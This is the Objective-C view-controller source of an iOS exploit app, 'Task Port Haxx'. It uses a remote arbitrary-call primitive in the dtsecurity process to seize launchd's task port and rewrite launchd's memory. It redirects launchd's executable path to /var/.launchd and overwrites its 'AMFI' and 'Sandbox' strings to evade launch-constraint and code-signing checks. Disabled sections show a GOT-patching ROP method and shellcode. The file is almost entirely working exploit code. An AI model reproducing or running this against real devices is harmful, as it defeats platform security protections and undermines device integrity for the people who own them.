//
//  ViewController.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

@import Darwin;
@import MachO;
@import XPC;
#import "ViewController.h"
#include "Header.h"
#include <sys/wait.h>

bool gIsPACSupported = false;

bool IsPACSupported(void) {
    cpu_subtype_t cpusubtype = 0;
    size_t sz = sizeof(cpusubtype);
    if (sysctlbyname("hw.cpusubtype", &cpusubtype, &sz, NULL, 0) != 0) return false;
    if (cpusubtype == CPU_SUBTYPE_ARM64E) return true;
    return false;
}

vm_offset_t findSbinLaunchdOff(void) {
    char *path = "/sbin/launchd";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    
    size_t size = 0;
    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
    assert(cstring);
    while (strcmp(cstring, "/sbin/launchd") != 0) {
        cstring += strlen(cstring) + 1;
    }
    
    munmap((void *)map, s.st_size);
    close(fd);
    return cstring - (char *)map;
}

@interface ViewController ()
@property(nonatomic) mach_port_t exceptionPort;
@property(nonatomic) mach_port_t fakeBootstrapPort;
@property(nonatomic) pid_t childPid, sleepPid;
@property(nonatomic) UITextView *logTextView;
@end

@implementation ViewController

- (void)viewDidLoad {
    gIsPACSupported = IsPACSupported();

    [super viewDidLoad];
    self.navigationItem.title = @"Task Port Haxx";
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Options" menu:[UIMenu menuWithTitle:@"Options" children:@[
        [UIAction actionWithTitle:@"Change Signed Pointer" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self changePtrTapped];
        }],
        [UIAction actionWithTitle:@"Userspace reboot" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self userspaceRebootTapped];
        }]
    ]]];
    self.navigationItem.rightBarButtonItems = @[
        [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Detach" style:UIBarButtonItemStylePlain target:self action:@selector(detachButtonTapped)]
    ];
    
    UITextView *textView = [[UITextView alloc] initWithFrame:self.view.bounds];
    textView.editable = NO;
    textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    textView.text = @"Log Output:\n";
    textView.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
    [self.view addSubview:textView];
    self.logTextView = textView;
    [self redirectStdio];
    
    self.exceptionPort = setup_exception_server();
    self.fakeBootstrapPort = setup_fake_bootstrap_server();
    self.childPid = -1;
}

- (void)redirectStdio {
    setvbuf(stdout, 0, _IOLBF, 0); // make stdout line-buffered
    setvbuf(stderr, 0, _IONBF, 0); // make stderr unbuffered
    
    /* create the pipe and redirect stdout and stderr */
    static int pfd[2];
    pipe(pfd);
    dup2(pfd[1], fileno(stdout));
    dup2(pfd[1], fileno(stderr));
    
    /* create the logging thread */
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ssize_t rsize;
        char buf[2048];
        while((rsize = read(pfd[0], buf, sizeof(buf)-1)) > 0) {
            if (rsize < 2048) {
                buf[rsize] = '\0';
            }
            NSString *logLine = [NSString stringWithUTF8String:buf];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.logTextView.text = [self.logTextView.text stringByAppendingString:logLine];
                NSRange bottom = NSMakeRange(self.logTextView.text.length -1, 1);
                [self.logTextView scrollRangeToVisible:bottom];
            });
        }
    });
}

- (void)changePtrTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Change Signed Pointer" message:@"Enter new signed pointer and diversifier value (hex):" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Signed Pointer (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%lx", NSUserDefaults.standardUserDefaults.signedPointer];
    }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Diversifier (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%x", NSUserDefaults.standardUserDefaults.signedDiversifier];
    }];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        UITextField *textField = alert.textFields.firstObject;
        NSUInteger signedPointer = strtoull(textField.text.UTF8String, NULL, 16);
        uint32_t diversifier = (uint32_t)strtoul(alert.textFields[1].text.UTF8String, NULL, 16);
        NSUserDefaults.standardUserDefaults.signedPointer = signedPointer;
        NSUserDefaults.standardUserDefaults.signedDiversifier = signedPointer ? diversifier : 0;
        printf("Set signed pointer to 0x%lx\n", signedPointer);
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:okAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)userspaceRebootTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Userspace Reboot" message:@"This will renew the PAC signature." preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *rebootAction = [UIAlertAction actionWithTitle:@"Reboot" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        userspaceReboot();
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:rebootAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)testButtonTapped {
    if (getpgid(_childPid) > 0) {
        printf("Child already spawned with PID %d\n", self.childPid);
        return;
    }
    self.childPid = 0; // TODO: get pid
    launchTest(@"dtsecurity");
}

- (void)arbCallButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        kern_return_t kr;
        
        // Create a region which holds temp data (should we use stack instead?)
        vm_size_t page_size = getpagesize();
        vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (!map) {
            printf("Failed to call mmap. Please try resetting pointer and try again\n");
            return;
        }
        printf("Mapped memory at 0x%lx\n", map);
        
        // Test mkdir
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(mkdir, map, 0700);
        
        // Get my task port
        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
//        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to get my task port\n");
//            return;
//        }
//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
        // Map the page we allocated in dtsecurity to this process
//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
//            return;
//        }
//        vm_address_t local_map = RemoteRead64(map);
//        printf("Created shared mapping: 0x%lx\n", local_map);
//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
        
        // Get dtsecurity dyld base for blr x19
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
         kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        vm_address_t remote_dyld_base;
        do {
            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
            // FIXME: why do I have to sleep a bit for dyld base to be available?
            usleep(100000);
        } while (remote_dyld_base == 0);
        printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
        
        // Get launchd task port
        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get launchd task port\n");
            return;
        }
        
        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
        printf("Got launchd task port: %d\n", launchd_task);
        
        // Get remote dyld base
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
        kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);

        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
            return;
        }
        uint32_t infoArrayCount = RemoteRead32(map);
        printf("launchd infoArrayCount: %u\n", infoArrayCount);
        
        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
            return;
        }
        
        // Enumerate images to find launchd base
        vm_address_t launchd_base = 0;
        vm_address_t infoArray = RemoteRead64(map);
        for (int i = 0; i < infoArrayCount; i++) {
            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
            uint64_t base = RemoteRead64(map);
            if (base % page_size) {
                // skip unaligned entries, as they are likely in dsc
                continue;
            }
            printf("Image[%d] = 0x%llx\n", i, base);
            // read magic, cputype, cpusubtype, filetype
            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
            uint64_t magic = RemoteRead32(map);
            if (magic != MH_MAGIC_64) {
                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                continue;
            }
            uint32_t filetype = RemoteRead32(map + 12);
            if (filetype == MH_EXECUTE) {
                printf("found launchd executable at 0x%llx\n", base);
                launchd_base = base;
                break;
            }
        }
        
        // Reprotect rw
        vm_offset_t launchd_str_off = findSbinLaunchdOff();
        
        printf("reprotecting 0x%lx\n", launchd_base + launchd_str_off);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_base + launchd_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed\n");
            return;
        }
        
        // Overwrite /sbin/launchd string to /var/.launchd
        const char *newPath = "/var/.launchd";
        RemoteWriteString(map, newPath);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            return;
        }
        
        printf("Successfully overwrote launchd executable path string to %s\n", newPath);


// Bypass panic by launch constraints
/*
    "panicString" : "panic(cpu 0 caller 0xfffffff0143bbf98): unexpected SIGKILL of launchd (CS_KILLED) with reason 
    -- namespace 3 code 0x4 description Launch Constraint Violation, error info: c[5]p[1]m[1]e[0], (Constraint not matched) launch type 0, 
    failure proc [vc: 4]: \/private\/preboot\/121F3E86149F8454EF446D420C7189A8968F14B26A79D959ECF01CD248BEC9895804698A25D95CA947847730F8BFDC9F\/launchd\nDebugger message: panic ...
*/

// *** Method 1: Patch `mov x0, #0, ret` address to _posix_spawnattr_setmacpolicyinfo_np_ptr@got ***
#if 0
        // 1. Find  _posix_spawnattr_setmacpolicyinfo_np_ptr symbol ptr address(which is in __auth_got segment) that will be overwritten.
        // Sorry, but it's hardcoded symbolptr address at that moment. because I'm lazy.

        /*
            ...
            __got:000000010006CB10 _posix_spawnattr_setmacpolicyinfo_np_ptr DCQ __imp__posix_spawnattr_setmacpolicyinfo_np
            __got:000000010006CB10                                         ; DATA XREF: _posix_spawnattr_setmacpolicyinfo_np↑o
            __got:000000010006CB10                                         ; _posix_spawnattr_setmacpolicyinfo_np+4↑r
            ...
        */
        vm_address_t _posix_spawnattr_setmacpolicyinfo_np_ptr_addr = launchd_base + 0x6CB10;

        // 2. Call vm_protect that modifying map state to read-write for __auth_got segment.
        // Sorry, but it's hardcoded map address at that moment. because I'm lazy.
        // For arm64, it's NOT __auth_got, just __got

        /*
            __unwind_info:000000010006BFFD                 DCB    0
            __unwind_info:000000010006BFFE                 DCB    0
            __unwind_info:000000010006BFFF                 DCB    0
            __unwind_info:000000010006BFFF ; __unwind_info ends
            __unwind_info:000000010006BFFF
            __got:000000010006C000 ; ===========================================================================
            __got:000000010006C000
            __got:000000010006C000 ; Segment type: Pure data
            __got:000000010006C000                 AREA __got, DATA, READONLY, ALIGN=3
            __got:000000010006C000                 ; ORG 0x10006C000
            __got:000000010006C000 ; NDR_record_t *NDR_record_ptr
            __got:000000010006C000 _NDR_record_ptr DCQ _NDR_record         ; DATA XREF: sub_100048D04+48↑r
            __got:000000010006C000                                         ; sub_100048D64+64↑r ...
            __got:000000010006C008 _SANDBOX_CHECK_NO_REPORT_ptr DCQ _SANDBOX_CHECK_NO_REPORT
            __got:000000010006C008                                         ; DATA XREF: sub_10001A180+10↑r
            ...
        */

        vm_address_t launchd_got = launchd_base + 0x6C000;
        printf("reprotecting launchd@got as Read-Write: 0x%lx\n", launchd_got);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_got, 0x4000, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed\n");
            return;
        }

        // 3. Find mov x0, #0; ret gadget or function address from dsc.
        /*
            __text:00000001000169B8 loc_1000169B8                           ; CODE XREF: __xpc_spawnattr_unpack_string+8↑j
            __text:00000001000169B8                 MOV             X0, #0
            __text:00000001000169BC                 RET
        */
        uint64_t launchd_mov_x0_0_gadget = launchd_base + 0x169B8;

        // 4. If you find it, signing address due to PAC.
        if(gIsPACSupported) {
            //TO DO...
        }

        // 5. And overwrite signed address to '_posix_spawnattr_setmacpolicyinfo_np_ptr' symbol ptr address.
        RemoteTaskHexDump(_posix_spawnattr_setmacpolicyinfo_np_ptr_addr, 0x100, launchd_task, (uint64_t)map);   //status: before;

        RemoteTaskWrite64(_posix_spawnattr_setmacpolicyinfo_np_ptr_addr, launchd_task, map, launchd_mov_x0_0_gadget);

        RemoteTaskHexDump(_posix_spawnattr_setmacpolicyinfo_np_ptr_addr, 0x100, launchd_task, (uint64_t)map);   //status: after; did it changed well?


        // 6. Modify again, map state to read-only __auth_got(or __got) for restore.
        printf("reprotecting launchd@got as Read only: 0x%lx\n", launchd_got);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_got, 0x4000, false, PROT_READ | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed\n");
            return;
        }

        // 7. Userspace reboot? (Beforehand put fastpathsigned launchd to path - /var/.launchd )
#endif

// *** Method 2: Patch `AMFI`, `Sandbox` string that being used as _amfi_launch_constraint_set_spawnattr's arguments ***
#if 1
        // Patch string `AMFI`
        vm_offset_t amfi_str_off = 0x6744c;

        printf("reprotecting 0x%lx\n", launchd_base + amfi_str_off);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_base + amfi_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed\n");
            return;
        }
        
        const char *newStr = "AAAA\x00";
        RemoteWriteString(map, newStr);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            return;
        }
        RemoteTaskHexDump(launchd_base + amfi_str_off, 0x100, launchd_task, (uint64_t)map);

        // Patch string `Sandbox`
        vm_offset_t sandbox_str_off = 0x5B918;

        printf("reprotecting 0x%lx\n", launchd_base + sandbox_str_off);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_base + sandbox_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed\n");
            return;
        }
        
        const char *newStr2 = "BBBBBBB\x00";
        RemoteWriteString(map, newStr2);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + sandbox_str_off, map, 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            return;
        }
        RemoteTaskHexDump(launchd_base + sandbox_str_off, 0x100, launchd_task, (uint64_t)map);

#endif


        RemoteArbCall(exit, 0);
        
        // stuff
//        uint64_t remote_list = map + sizeof(uint64_t);
//        RemoteArbCall(task_threads, launchd_task, remote_list, map);
//        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
//        RemoteArbCall(memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
//        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
//        for (int i = 0; i < listCnt; i++) {
//            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
//            // panic your launchd
//            RemoteArbCall(thread_abort, act_list[i]);
//        }
        
//        arm_thread_state64_internal ts;
//        RemoteArbCall(memset, map+0x10, 0x41, sizeof(ts));
//        kr = RemoteArbCall(thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
//        printf("thread_create_running returned %d\n", kr);
//        thread_act_t tid = RemoteRead32(map);
//        printf("tid: 0x%x\n", tid);
        
//        printf("Sleeping...\n");
//        RemoteArbCall(sleep, 10);
        
        // Get remote dyld base for blr x19
//        mach_port_t remote_task = (mach_port_t)RemoteArbCall(task_self_trap);
//        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
//        kern_return_t kr = (kern_return_t)RemoteArbCall(task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
//        if (kr != KERN_SUCCESS) {
//            printf("task_info failed\n");
//            return;
//        }
//        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
//        vm_address_t remote_dyld_base;
//        do {
//            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
//            printf("Remote dyld base: 0x%lx\n", remote_dyld_base);
//            // FIXME: why do I have to sleep a bit for dyld base to be available?
//            usleep(100000);
//        } while (remote_dyld_base == 0);
//        blrX19Address = remote_dyld_base + blrX19Offset;
        
        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
//        RemoteArbCall(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
//        mach_port_t remote_bootstrap_port = RemoteRead32(map);
//        RemoteWriteString(map, "_os_alloc_once_table");
//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(dlsym, (uint64_t)RTLD_DEFAULT, map);
//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(_os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
//        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
//        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(xpc_pipe_create_from_port, remote_bootstrap_port, 0);
//        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
//        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
//        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
        
//        RemoteArbCall((void*)dlopen, 0x41414141, 0);
//        printf("--- MARK: DONE FUNCTION CALL ---\n");
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(mkdir, map, 0700);
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(((uint64_t (*)(void))map));
    });
}

- (void)detachButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        RemoteDetach();
    });
}

- (void)alertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:okAction];
    [self presentViewController:alert animated:YES completion:nil];
}

@end
